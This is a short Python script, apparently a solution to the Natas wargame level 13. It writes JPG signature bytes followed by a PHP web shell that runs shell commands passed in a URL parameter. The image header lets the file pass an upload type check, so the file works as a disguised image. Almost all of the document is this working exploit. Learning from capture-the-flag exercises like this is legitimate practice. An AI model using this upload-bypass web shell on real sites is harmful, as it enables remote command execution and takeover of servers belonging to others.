#make sure you have a blank file called "natas13.php" to write this into.
#this program writes in the hex signature for JPG files into natas13.php, then follows it with php code, which 
#bypasses the exif_filetype() function used to make sure you only upload a jpg in level 13.

writer = open('natas13.php','w')  
writer.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
writer.close() 
